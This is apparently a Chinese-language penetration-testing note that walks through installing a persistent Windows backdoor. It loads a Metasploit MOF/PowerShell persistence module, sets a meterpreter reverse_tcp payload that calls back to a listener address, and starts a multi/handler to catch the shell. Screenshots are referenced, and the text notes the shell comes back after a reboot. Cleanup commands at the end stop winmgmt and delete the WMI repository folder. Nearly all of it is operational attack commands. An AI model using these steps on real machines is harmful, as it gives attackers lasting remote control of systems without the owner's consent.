	>git clone https://github.com/khr0x40sh/metasploit-modules.git
	>mv metasploit-modules/persistence/mof_ps_persist.rb /usr/share/metasploit-framework/modules/post/windows/
	>reload_all
	>use post/windows/mof_ps_persist
	>set payload windows/x64/meterpreter/reverse_tcp
	>set lhost 192.168.0.108
	>set lport 12345
	>set session 1
	>run
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/453.png)

	>use exploit/multi/handler
	>set payload windows/x64/meterpreter/reverse_tcp
	>set lhost 192.168.0.108
	>set lport 12345
	>set exitonsession false
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/454.png)

	重启后还会上线
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/455.png)

	清除后门，进入meterpreter，resource 生成的rc文件
	停止MOF
	>net stop winmgmt
	删除文件夹：C:\WINDOWS\system32\wbem\Repository\
	>net start winmgmt 